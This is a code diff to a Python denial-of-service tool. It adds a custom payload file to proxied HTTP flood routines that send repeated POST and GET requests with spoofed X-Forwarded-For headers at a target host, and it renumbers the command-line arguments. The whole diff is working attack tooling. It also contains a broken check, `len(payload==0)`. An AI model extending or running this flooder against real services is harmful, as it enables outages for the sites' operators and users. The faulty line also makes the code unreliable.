@@ -22,15 +22,15 @@ def spoofer():
 
 
 def start_attack(method, threads, event, socks_type):
-    global out_file
+    global out_file,payload
     # layer7
     cmethod = str(method.upper())
     if (cmethod != "HIT") and (cmethod not in l4) and (cmethod not in l3) and (cmethod != "OSTRESS"):
         out_file = "proxy.txt"
         proxydl(out_file, socks_type)
-        print("{} Attack Started To {}:{} With {}/{} Proxy ".format(method, target, port,len(proxies), str(nums)))
+        print("Attack Started | Type: {} | Target: {}:{} | Proxy: {}/{} | Payload: {}/{}".format(method, target, port,len(proxies), len(proxies) if nums==0 else str(nums),"false" if len(payload)==0 else "true",str(len(payload))+" byets"))
     else:
-        print("{} Attack Started To {}:{}.".format(method, target, port))
+        print("Attack Started | Type: {} | Target: {}:{}.".format(method, target, port))
     try:
         if method == "post":
             for _ in range(threads):
@@ -131,6 +131,7 @@ def random_data():
 
 
 def Headers(method):
+    global payload
     header = ""
     if method == "get" or method == "head":
         connection = "Connection: Keep-Alive\r\n"
@@ -208,7 +209,10 @@ def Headers(method):
         connection = "Cache-Control: max-age=0\r\n"
         connection += "pragma: no-cache\r\n"
         connection += "X-Forwarded-For: " + spoofer() + "\r\n"
-        data = str(random._urandom(8))
+        if len(payload==0):
+            data = str(random._urandom(8))
+        else:
+            data = payload
         length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
         header = post_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
     elif method == "hit":
@@ -724,7 +728,7 @@ def AVB(event, socks_type):
                 s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
             try:
                 for _ in range(multiple):
-                    s.post(sys.argv[6], timeout=1, data=payload)
+                    s.post(sys.argv[7], timeout=1, data=payload)
             except:
                 s.close()
         except:
@@ -748,7 +752,7 @@ def bypass(event, socks_type):
                 s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
             try:
                 for _ in range(multiple):
-                    s.post(sys.argv[6], timeout=1, data=payload)
+                    s.post(sys.argv[7], timeout=1, data=payload)
             except:
                 s.close()
         except:
@@ -772,7 +776,7 @@ def dgb(event, socks_type):
             try:
                 sleep(5)
                 for _ in range(multiple):
-                    s.get(sys.argv[6])
+                    s.get(sys.argv[7])
             except:
                 s.close()
         except:
@@ -917,19 +921,23 @@ def post(event, socks_type):
     while time.time() < timer:
         try:
             s = socks.socksocket()
+
             if socks_type == 4:
                 s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
             if socks_type == 5:
                 s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             if socks_type == 1 or socks_type==0:
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+                
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(target), int(port)))
+
             if protocol == "https":
                 ctx = ssl.SSLContext()
                 s = ctx.wrap_socket(s, server_hostname=target)
             try:
                 for _ in range(multiple):
+
                     s.sendall(str.encode(request))
             except:
                 s.close()
@@ -1233,7 +1241,7 @@ def downloadsocks(choice):
 
 
 def main():
-    global proxies, multiple, choice, timer, out_file,check_socks
+    global proxies, multiple, choice, timer, out_file,check_socks,payload
     method = str(sys.argv[1]).lower()
     
     out_file = str("proxy.txt")
@@ -1241,10 +1249,10 @@ def main():
         makefile(out_file)
 
     if method == "check":
-        proxydl(out_file, socks_type)
+        proxydl(out_file, 1)
         exit()
     if method == "stop":
-        url = str(sys.argv[6]).strip()
+        url = str(sys.argv[7]).strip()
         UrlFixer(url)
         stop()
     elif (method == "help") or (method == "h"):
@@ -1255,7 +1263,7 @@ def main():
         print("method not found")
         exit()
     timer = int(time.time()) + 100000000
-    url = str(sys.argv[6]).strip()
+    url = str(sys.argv[7]).strip()
     UrlFixer(url)
     choice = str(sys.argv[2]).strip()
     if choice != "4" and choice != "5" and choice != "1" and choice!="0":
@@ -1274,6 +1282,14 @@ def main():
     
     threads = int(sys.argv[4])
     proxies = open(out_file).readlines()
+
+    payload_file=str(sys.argv[6]).strip()
+    try:
+        f_payload = open(payload_file, 'r', encoding="utf8")
+        payload=f_payload.read()
+    except:
+        payload=""
+
     if method == "slow":
         conn = threads
         proxydl(out_file, socks_type)
@@ -1398,7 +1414,7 @@ def tools():
     try:
         tool = sys.argv[2].lower()
         if tool != "dstat":
-            domain = sys.argv[6]
+            domain = sys.argv[7]
             if str('.') not in str(domain):
                 print('address not found')
                 toolgui()
@@ -1481,11 +1497,11 @@ def usgeaseets():
     try:
         methos = metho.upper()
         if (methos in l4) or (methos in l3):
-            url = sys.argv[6]
-        elif str("http") not in sys.argv[6]:
+            url = sys.argv[7]
+        elif str("http") not in sys.argv[7]:
             url = "https://example.com"
-        elif sys.argv[6]:
-            url = sys.argv[6]
+        elif sys.argv[7]:
+            url = sys.argv[7]
         else:
             url = "https://example.com"
     except:
@@ -1611,7 +1627,7 @@ if __name__ == '__main__':
                 stop()
             elif bdr == "help":
                 usge()
-            elif len(sys.argv) < int(5):
+            elif len(sys.argv) < int(7):
                 usge()
             else:
                 main()
